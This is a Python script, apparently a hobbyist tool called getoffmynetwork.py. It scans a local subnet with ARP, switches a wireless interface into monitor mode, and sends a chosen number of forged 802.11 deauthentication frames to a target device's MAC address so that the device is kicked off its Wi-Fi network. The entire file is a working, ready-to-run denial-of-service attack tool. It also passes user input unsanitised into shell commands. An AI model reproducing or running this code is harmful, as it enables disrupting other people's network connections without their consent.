#!/usr/bin/env python
# getoffmynetwork.py 
# author = Jesse
# date = 10/2/2018


# try to import the needed modules
try:
	from scapy.all import *
	from termcolor import colored
	import subprocess
	import os
	import time
	import sys
	import urllib2
	

# handling ImportError
except ImportError:
	# cannot print colored text because user might not have module for this installed		
	print('requirements arent properly statisfied! (check README for installation)')
	sys.exit()

except KeyboardInterrupt:
	# cannot print colored text because user might not have the module for this installed
	print('requested shutdown...')
	sys.exit()




# defining variables 


# for cleaner errors
sys.tracebacklimit=0

# defining a variable that contains 'ip route' to retrieve your default gateway
router_ip = subprocess.check_output('ip route', shell=True)

# defining a variable that contains the command 'ifconfig | grep inet'
local_ip = subprocess.check_output('ifconfig | grep inet', shell=True)



# functions starting here

def exit():
	try:
		# requested shutdown :(
		print(colored('\n\n[-]', 'red')),
		print('requested shutdown\n')

		time.sleep(1)

		# checks if iface is in monitor mode
		# checks if the script went until the assignment of the mon variable,
		# if it did, your iface should be set into monitor mode
		if monInterface[-3:] == 'mon':
			print(colored('[*]', 'red')),
			print('stopping monitor mode on ' + monInterface + '\n')
			# stopping monitor mode on iface
			stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)

			# hide the stop_mon_mode output to keep the shell clean			
			print(stop_mon_mode[0:0])
			

			time.sleep(0.5)
				
			print(colored('[*]', 'red')),
			print('done!')
			# exit this script
			sys.exit()

	# a NameError would occur if you exit before you assign all variables, this hides this error
	except NameError:
		sys.exit()

	

# function that checks if the user has an internet connection
def check_connection():

	try:
		# open google.com
	    response=urllib2.urlopen('https://www.google.com/')

	# if an error occurs, quit
	except urllib2.URLError:
		# still display the logo even if the user doesnt have a internet connection
		# clearing the screen
		subprocess.call('clear',shell=True)

		# printing the logo with figlet
		print('==============================================================================================================')
		figlet = subprocess.check_output('figlet -c -f big getofmynetwork -w 100', shell=True)
		print(colored(figlet, 'red'))
		print('==============================================================================================================')
			
		# lettting user know
		print(colored('\n[!]', 'red')),
	    	print('you have to be connected to a network to use getofmynetwork.py!')
		
		# time.sleep for the looks
		time.sleep(0.7)

		print(colored('\n[*]', 'red')),
		print('exiting...')

		# time.sleep for the looks
		time.sleep(1)
	
		# exiting
		sys.exit()
	

check_connection()



# check if user is root
def check_root():
	# userid of root is always 0
	if os.geteuid() != 0:
		print('getofmynetwork.py needs root priveleges to run, please try again with sudo')
		sys.exit()
	
check_root()




def heading():

		try:
			# clearing the screen
			subprocess.call('clear',shell=True)

			# printing the logo with figlet
			print('==============================================================================================================')
			figlet = subprocess.check_output('figlet -c -f big getofmynetwork -w 100', shell=True)
			print(colored(figlet, 'red'))
			print('==============================================================================================================')
			

		except KeyboardInterrupt:
			exit()




def arp_ping():	
		
	try:

		while True:
			print(colored('\n[*]', 'red')),
			# ask for local subnet
			askSubnet = raw_input('enter your local subnet for the ARP ping(e.g. 192.168.0.0/16): ')
			# a subnet always contains a /
			# or user just wants to scan a single host but thats probably not the case
			if not '/' in askSubnet:
				print(colored('[!]', 'red')),
				print('please enter a valid subnet')
				
				time.sleep(0.5)

				# keep printing until a valid subnet is entered
				continue

						
			# minimum length of a subnet is something like 10 ^^
			if len(askSubnet) < 10:
				print(colored('[!]', 'red')),
				print('please enter a valid subnet')
				
				time.sleep(0.5)

				# keep printing until a valid subnet is entered
				continue

			if len(askSubnet) > 15:
				print(colored('[!]', 'red')),
				print('please enter a valid subnet')
				
				time.sleep(0.5)

				# keep printing until a valid subnet is entered
				continue

			else:

				print(colored('\n[*]', 'red')),
				# letting the user know the arp ping is running
				print('ARP ping is running...\n')
					
				# performing the arp ping on the whole subnet with scapy			
				arp_ping = ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=askSubnet),timeout=2)

				# displaying the arp ping output on the screen(IP and MACaddr)
				arp_ping_output = ans.summary(lambda (s,r): r.sprintf('%ARP.psrc% has %Ether.src%') )

				# not all at once!
				time.sleep(1)
							
				print(colored('[!]', 'red')),		
				# prints the users default gateway	
				print('your default gateway is at ' + router_ip[12:26])

				print(colored('[!]', 'red')),
				# prints users local ip
				print('you are at' + local_ip[12:26])

				time.sleep(1)

				# breaking the loop
				break

				
			
			
	except KeyboardInterrupt:
		exit()



def getofmynetwork():

	try:
		# this might not be the best way to do it but it works so...
		while True:
					
			print(colored('\n[*]', 'red')),
			# ask iface
			iface = raw_input('enter interface: ')


			# < 3 character interface name?
			if len(iface) < 3:
				print(colored('[!]', 'red')),
				print('please enter a valid interface')
					
				time.sleep(0.5)

				# keep printing until a valid interface name is entered
				continue
				
			
				
			time.sleep(1)

			# eth0 might not support monitor mode
			if 'eth' in iface:
				# sleep for a short time
				time.sleep(0.3)
				print(colored('[!]', 'red')),
				print('make sure your interface can be put into monitor mode and supports packet injection!')

				
			# make sure the user enters the non-monitor mode iface name to prevent later errors
			if iface[-3:] == 'mon':
				print(colored('[!]', 'red')),
				print('you have to enter the non-monitor mode iface name')
		
				time.sleep(0.5)

				# keep printing until a valid iface name is entered
				continue

			# then the input is valid so this part is done
			else:

				# starting a new while loop inside the other while loop so the variables are defined in the other while loops
				while True:
					# sleep for the looks
					time.sleep(0.5)

					print(colored('\n[*]', 'red')),	
					# asking routers mac	
					router_mac = raw_input('enter default gateway mac: ')
					# if there isnt a ':' in the users input
					if not ':' in router_mac:
						print(colored('[!]', 'red')),
						print('please enter a valid mac address')
				
						time.sleep(0.5)
					
						# keep going until a valid mac address has been entered
						continue

						
					# mac addresses are always 17 characters long
					if len(router_mac) != 17:
						print(colored('[!]', 'red')),
						print('please enter a valid mac address')
					
						time.sleep(0.5)

						# keep going until a valid mac address has been entered
						continue
						

					# then the input is valid so we can break the loop and move on
					else:
						
						# another while loop...
						while True:


							# sleep before asking
							time.sleep(1)

							print(colored('\n[*]', 'red')),			
							target_mac = raw_input('enter targets mac: ')
							
							# mac addresses are always 17 characters long
							if len(target_mac) != 17:
								print(colored('[!]', 'red')),
								print('please enter a valid mac address')
								
								time.sleep(0.5)

								# keep going until a valid mac address has been entered
								continue 


							time.sleep(1)


							# if target mac does not contain at least one ':' 
							if not ':' in target_mac:
								print(colored('[!]', 'red')),
								print('please enter a valid mac address')
						
								time.sleep(0.5)

								# keep going until a valid mac address has been entered
								continue
							
							# then the input is valid so we can go on 
							else:
						
								# and another one
								while True:

									# asking amount of deauth packets
									print(colored('\n[*]', 'red')),
									amount = raw_input('enter the amount of deauthentication packets you want to send(100-150 is recommended): ')
									# if users input is not a number/digit
									if not amount.isdigit():
										print(colored('[!]', 'red')),
										print('the amount has to be a number!')
								
										time.sleep(0.5)
										
										# keep going until input is valid
										continue

									if len(amount) < 2:
										print(colored('[!]', 'red')),
										print('you have to send at least 10 packets!')

										time.sleep(0.5)

										# keep printing the above until input is valid
										continue 
		
								
									
									# then the input is valid so we can continue to the next part
									else:
									

										# starting monitor mode

										print(colored('\n[*]', 'red')),
										# letting the user know what is going on
										print('setting monitor mode up on ' + iface)
										
										# putting iface into monitor mode
										start_mon_mode = subprocess.check_output('airmon-ng start ' + iface, shell=True)
										# output should be longer than 30 characters
										if len(start_mon_mode) < 30:
											print(colored('[!]', 'red'))
											print('an error occured when setting monitor mode up on ' + iface)
											sys.exit()
											
					
										time.sleep(1)

									
										# hide the start_mon_mode output to keep the shell clean
										print(start_mon_mode[0:0])
									
									
										# hide the start_mon_mode output to keep the shell clean
										print(start_mon_mode[0:0])
										print(colored('[+]', 'red')),
										print('monitor mode on ' + iface + ' has been set up!')

										

											
										# iface name when in monitor mode
										monInterface = iface+'mon'
										
										time.sleep(1)
							
										# defining some more variables that are needed to excecute the deauthentication attack
										conf.iface = iface+'mon'
										conf.verb = 0
												



										# the deauthentication packet crafted with scapy
										packet = RadioTap()/Dot11(type=0,subtype=12,addr1=target_mac,addr2=router_mac,addr3=router_mac)/Dot11Deauth(reason=7)



										# for loop for sending deauth packets
										for n in range(int(amount)):

											# sending the packet
											sendp(packet)
											print(colored('[+]', 'red')),
											print('packets are being sent to ' + target_mac)

										time.sleep(0.5)

										# out of the for loop so it will only be printed once
										print(colored('\n[+]', 'red')),
										print('done sending ' + amount + ' packets!')
										print(colored('\n[+]', 'red')),
										print('the host has now been kicked of the network!')

										time.sleep(0.5)

										# checks if interface is in monitor mode
										# check if the script went until the assignment of the monInterface variable,
										# it probably did but its never a bad idea to still check
										if monInterface[-3:] == 'mon':
											print(colored('\n[*]', 'red')),
											print('stopping monitor mode on ' + monInterface)
											# stopping monitor mode on interface
											stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
									
											# hide the stop_mon_mode output to keep the shell clean			
											print(stop_mon_mode[0:0])
												
											time.sleep(1)
												
											print(colored('[+]', 'red')),
											print('done!\n')
							
											# dont forget to break the loop if the user makes it until the end!
											break



	# Ctrl + C
	except KeyboardInterrupt:
		exit()	



	# exception for IOErrors
	except IOError:
		print(colored('\n[-]', 'red')),
		print('interface does not support monitor mode or is not available')
		print(colored('[-]', 'red')),
		print('exiting...')
		sys.exit()

		
									

# calling the created functions			
heading()
arp_ping()
getofmynetwork()
